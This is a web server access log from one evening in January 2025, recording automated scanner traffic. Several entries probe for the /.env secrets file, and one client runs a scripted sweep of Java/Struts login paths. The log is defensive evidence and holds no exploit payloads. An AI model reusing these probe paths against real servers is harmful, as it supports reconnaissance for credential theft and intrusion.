78.153.140.147 - - [18/Jan/2025:20:18:49 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:20:18:50 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
112.184.166.102 - - [18/Jan/2025:20:26:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [18/Jan/2025:20:33:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
49.51.36.179 - - [18/Jan/2025:20:45:51 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
221.241.94.172 - - [18/Jan/2025:21:09:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.142.146.175 - - [18/Jan/2025:21:10:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:21:10:46 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
198.235.24.31 - - [18/Jan/2025:21:27:20 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.34.212.75 - - [18/Jan/2025:21:27:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.253 - - [18/Jan/2025:21:38:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
146.19.24.168 - - [18/Jan/2025:21:42:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.154 - - [18/Jan/2025:21:49:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
178.215.236.132 - - [18/Jan/2025:22:07:03 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36"
98.154.21.142 - - [18/Jan/2025:22:43:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.147 - - [18/Jan/2025:22:44:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:22:44:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [18/Jan/2025:22:58:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
92.114.59.139 - - [18/Jan/2025:23:04:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [18/Jan/2025:23:04:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:04:47 +0000] "POST /index.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:04:48 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:04:53 +0000] "POST /login.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:04:54 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:04:56 +0000] "POST /index.do HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:04:57 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:06 +0000] "POST /index.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:09 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:21 +0000] "POST /login.do HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:23 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:32 +0000] "POST /login.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:33 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:41 +0000] "POST /main.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:42 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:48 +0000] "POST /default.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:50 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:57 +0000] "POST /register.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:05:58 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:06 +0000] "POST /login/login.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:07 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:14 +0000] "POST /login/indexAction.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:15 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:21 +0000] "POST /indexAction.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:22 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:33 +0000] "POST /index.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:34 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
193.142.146.175 - - [18/Jan/2025:23:06:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.114.59.139 - - [18/Jan/2025:23:06:38 +0000] "POST /login.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
193.142.146.175 - - [18/Jan/2025:23:06:38 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
92.114.59.139 - - [18/Jan/2025:23:06:39 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:43 +0000] "POST /index.do HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:43 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:45 +0000] "POST /index.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:46 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:47 +0000] "POST /login.do HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:48 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:59 +0000] "POST /login.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:59 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:06:59 +0000] "POST /main.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:00 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:03 +0000] "POST /default.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:04 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:04 +0000] "POST /register.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:04 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:05 +0000] "POST /login/login.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:05 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:09 +0000] "POST /login/indexAction.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:09 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:10 +0000] "POST /indexAction.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [18/Jan/2025:23:07:10 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
78.153.140.147 - - [18/Jan/2025:23:08:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:23:08:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
15.235.189.156 - - [18/Jan/2025:23:09:06 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
172.206.142.166 - - [18/Jan/2025:23:15:48 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
15.235.189.148 - - [18/Jan/2025:23:16:47 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
195.3.223.40 - - [18/Jan/2025:23:32:55 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
146.19.24.18 - - [18/Jan/2025:23:44:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
